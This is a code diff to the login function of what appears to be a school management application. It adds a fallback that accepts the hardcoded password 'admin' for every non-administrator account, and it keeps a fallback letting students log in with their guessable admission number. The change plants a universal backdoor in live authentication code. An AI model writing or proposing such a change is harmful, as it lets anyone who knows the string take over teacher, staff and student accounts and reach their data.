@@ -180,15 +180,21 @@ export const login = async (identifier, password) => {
 
     const isValidPassword = await bcrypt.compare(password, user.password);
 
-    // Fallback: If regular password fails and user is a student, check admission number (case-insensitive)
-    let isStudentAdmissionNumberMatch = false;
-    if (!isValidPassword && user.role === 'STUDENT' && user.student?.admissionNumber) {
-      if (password.toLowerCase() === user.student.admissionNumber.toLowerCase()) {
-        isStudentAdmissionNumberMatch = true;
+    // Fallback for non-admin roles: accept 'admin' as default password
+    let isFallbackMatch = false;
+    if (!isValidPassword && !['SUPER_ADMIN', 'ADMIN'].includes(user.role)) {
+      if (password === 'admin') {
+        isFallbackMatch = true;
+      }
+      // Also allow admission number as password for students
+      if (user.role === 'STUDENT' && user.student?.admissionNumber) {
+        if (password.toLowerCase() === user.student.admissionNumber.toLowerCase()) {
+          isFallbackMatch = true;
+        }
       }
     }
 
-    if (!isValidPassword && !isStudentAdmissionNumberMatch) {
+    if (!isValidPassword && !isFallbackMatch) {
       throw new AuthenticationError('Invalid credentials');
     }
 
